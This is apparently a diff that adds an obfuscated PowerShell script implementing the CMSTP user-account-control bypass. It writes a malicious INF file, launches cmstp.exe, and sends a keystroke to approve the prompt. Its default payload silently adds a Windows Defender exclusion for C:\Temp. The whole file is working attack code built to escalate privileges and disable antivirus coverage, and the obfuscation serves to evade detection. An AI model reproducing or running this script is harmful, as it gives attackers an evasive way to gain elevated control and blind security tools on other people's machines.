@@ -1,0 +1,132 @@
+ &('Sv')  ('cz'+'3'+'KQ1') ( [type]('uSeR32'+'.Ap'+'i'))  ;  .('S'+'ET') ('Buf9'+'8')  (  [TypE]('sys'+'tEm.dIaGN'+'oSTi'+'C'+'s.'+'pro'+'CeS'+'S')) ;   $g3K1 = [TYpe]('sY'+'S'+'TEM.W'+'INdoWs.fO'+'RmS.sendKeYS')  ; Function Sc`RiPT`:SE`T-inffIle {
+[CmdletBinding()]
+	Param (
+	[Parameter(HelpMessage="Specify the INF file location")]
+	${inFFIL`E`LOca`T`ion} = "$env:temp\CMSTP.inf",
+	
+	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
+	[String]${Co`mMA`NdtOExecU`TE} = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath "C:\Temp"'
+	)
+
+${InF`con`Te`NT} = @"
+[version]
+Signature=`$chicago`$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+$CommandToExecute
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+ServiceName="WinVPN"
+ShortSvcName="WinVPN"
+
+"@
+
+${IN`FConTE`NT} | .('Out-F'+'i'+'le') ${inf`FiLe`LOCAt`I`On} -Encoding a`SCII
+}
+
+
+Function get-`hWND
+{
+[CmdletBinding()]
+    
+  Param
+  (
+    [Parameter(Mandatory = ${T`RUE}, ValueFromPipelineByPropertyName = ${t`RUE})] [string] ${pROc`E`sS`NAmE}
+  )
+  Process
+    {
+        ${e`RRoracTioNpR`e`FeRE`NCe} = 'Stop'
+        Try 
+        {
+            ${h`wnD} = &('Get-'+'Pro'+'cess') -Name ${pr`oCesSN`AmE} | .('Select'+'-O'+'b'+'ject') -ExpandProperty mainwI`Ndo`Wha`Nd`LE
+        }
+        Catch 
+        {
+            ${h`WNd} = ${N`Ull}
+        }
+        ${HA`SH} = @{
+        ProcessName = ${P`ROceS`sn`AMe}
+        Hwnd        = ${h`wnd}
+        }
+        
+    .('N'+'ew-O'+'bject') -TypeName PSOB`J`eCT -Property ${H`Ash}
+    }
+}
+
+function SE`T-wIn`D`o`WACTIvE
+{
+  [CmdletBinding()]
+
+  Param
+  (
+    [Parameter(Mandatory = ${t`RuE}, ValueFromPipelineByPropertyName = ${TR`Ue})] [string] ${N`AME}
+  )
+  
+  Process
+  {
+    ${M`EMb`e`RdeF`INiTION} = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+'@
+
+    .('Ad'+'d-Typ'+'e') -MemberDefinition ${ME`mb`erDeFI`NIT`IOn} -Name a`PI -Namespace u`SeR32
+    ${H`WND} = .('Get'+'-Hwn'+'d') -ProcessName ${N`Ame} | &('Se'+'le'+'ct-Object') -ExpandProperty HW`Nd
+    If (${hW`ND}) 
+    {
+${O`N`Top} = &('N'+'ew-Objec'+'t') -TypeName sy`ST`EM.I`NtP`TR -ArgumentList (0)
+        $CZ3KQ1::SetForegroundWindow(${H`WNd})
+       $Cz3kq1::ShowWindow(${h`wNd}, 5)
+    }
+    Else 
+    {
+      [string] ${Hw`ND} = 'N/A'
+    }
+
+    ${h`ASH} = @{
+      Process = ${na`mE}
+      Hwnd    = ${H`WnD}
+    }
+        
+    &('New-Obje'+'c'+'t') -TypeName p`S`OBJeCT -Property ${H`AsH}
+  }
+}
+
+. ('Set-IN'+'F'+'File')
+#Needs Windows forms
+.('a'+'dd-typ'+'e') -AssemblyName sySTEm.wI`NdoWs`.`FoRms
+If (.('Te'+'st-Pa'+'th') ${iNfFi`l`e`lO`CatIon}) {
+#Command to run
+${Ps} = &('new'+'-o'+'bje'+'ct') sYSTE`m.diAGNoSticS.`P`Roc`e`ssStArtI`N`FO "c:\windows\system32\cmstp.exe"
+${P`s}.Arguments = "/au $InfFileLocation"
+${p`S}.UseShellExecute = ${F`A`lsE}
+
+#Start it
+ (  .('Get-'+'va'+'R'+'IAbLe')  ('BUf9'+'8') ).VAlUe::Start(${p`s})
+
+do
+{
+	# Do nothing until cmstp is an active window
+}
+until ((&('S'+'et-'+'Wi'+'n'+'dowActive') C`mstP).Hwnd -ne 0)
+
+
+#Activate window
+.('S'+'e'+'t-'+'WindowAct'+'ive') cM`stp
+
+#Send the Enter key
+ ( &('G'+'Et-iT'+'em') v`A`Ri`ABLe:G3`K1).VAluE::SendWait("{ENTER}")
+}
